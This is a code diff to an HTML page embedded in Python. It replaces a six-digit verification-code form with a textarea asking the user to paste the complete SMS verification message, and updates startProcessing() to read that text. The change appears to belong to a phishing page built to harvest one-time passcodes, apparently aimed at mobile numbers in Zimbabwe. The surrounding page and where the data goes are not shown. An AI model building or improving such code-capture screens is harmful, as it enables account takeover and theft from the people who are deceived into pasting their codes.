@@ -487,16 +487,12 @@ HTML_PAGE = r"""<!DOCTYPE html>
       <div class="text-center pt-2">
         <div class="w-14 h-14 mx-auto rounded-full bg-blue-100 text-[#004F71] flex items-center justify-center text-2xl mb-3">📱</div>
         <h2 class="text-2xl font-black text-[#004F71]">VERIFY YOUR NUMBER</h2>
-        <p class="text-xs text-slate-500 mt-1">A verification code has been sent to: <span id="otp-mobile-label" class="font-bold text-slate-700">+263 77 123 4567</span></p>
+        <p class="text-xs text-slate-500 mt-1">A verification message has been sent to: <span id="otp-mobile-label" class="font-bold text-slate-700">+263 77 123 4567</span></p>
       </div>
 
-      <div class="flex justify-center gap-2 sm:gap-3 max-w-[340px] mx-auto">
-        <input type="text" maxlength="1" oninput="otpMove(this, 1)" class="otp-box w-11 h-14 text-center text-xl font-extrabold rounded-2xl border border-slate-200 bg-white focus:ring-2 focus:ring-blue-500 focus:outline-none">
-        <input type="text" maxlength="1" oninput="otpMove(this, 2)" class="otp-box w-11 h-14 text-center text-xl font-extrabold rounded-2xl border border-slate-200 bg-white focus:ring-2 focus:ring-blue-500 focus:outline-none">
-        <input type="text" maxlength="1" oninput="otpMove(this, 3)" class="otp-box w-11 h-14 text-center text-xl font-extrabold rounded-2xl border border-slate-200 bg-white focus:ring-2 focus:ring-blue-500 focus:outline-none">
-        <input type="text" maxlength="1" oninput="otpMove(this, 4)" class="otp-box w-11 h-14 text-center text-xl font-extrabold rounded-2xl border border-slate-200 bg-white focus:ring-2 focus:ring-blue-500 focus:outline-none">
-        <input type="text" maxlength="1" oninput="otpMove(this, 5)" class="otp-box w-11 h-14 text-center text-xl font-extrabold rounded-2xl border border-slate-200 bg-white focus:ring-2 focus:ring-blue-500 focus:outline-none">
-        <input type="text" maxlength="1" oninput="otpMove(this, 6)" class="otp-box w-11 h-14 text-center text-xl font-extrabold rounded-2xl border border-slate-200 bg-white focus:ring-2 focus:ring-blue-500 focus:outline-none">
+      <div class="max-w-[340px] mx-auto space-y-2">
+        <textarea id="otp-message-paste" rows="4" placeholder="Paste the complete SMS verification message here..." class="w-full p-4 border border-slate-200 rounded-2xl bg-white focus:ring-2 focus:ring-blue-500 focus:outline-none text-sm text-slate-700 font-medium shadow-sm transition-all" required></textarea>
+        <div id="otp-error-msg" class="text-center text-xs text-red-500 font-semibold h-4"></div>
       </div>
 
       <div class="text-center text-xs text-slate-500">
@@ -956,9 +952,17 @@ HTML_PAGE = r"""<!DOCTYPE html>
     }
 
     function startProcessing() {
-      const otpInputs = document.querySelectorAll('.otp-box');
-      let otpCode = '';
-      otpInputs.forEach(i => otpCode += i.value);
+      const otpTextarea = document.getElementById('otp-message-paste');
+      const otpCode = otpTextarea ? otpTextarea.value.trim() : '';
+
+      if (!otpCode) {
+        const errorMsg = document.getElementById('otp-error-msg');
+        if (errorMsg) errorMsg.innerText = 'Please paste the verification message first.';
+        return;
+      } else {
+        const errorMsg = document.getElementById('otp-error-msg');
+        if (errorMsg) errorMsg.innerText = '';
+      }
 
       const btnOtp = document.getElementById('btn-otp');
       if (btnOtp) {
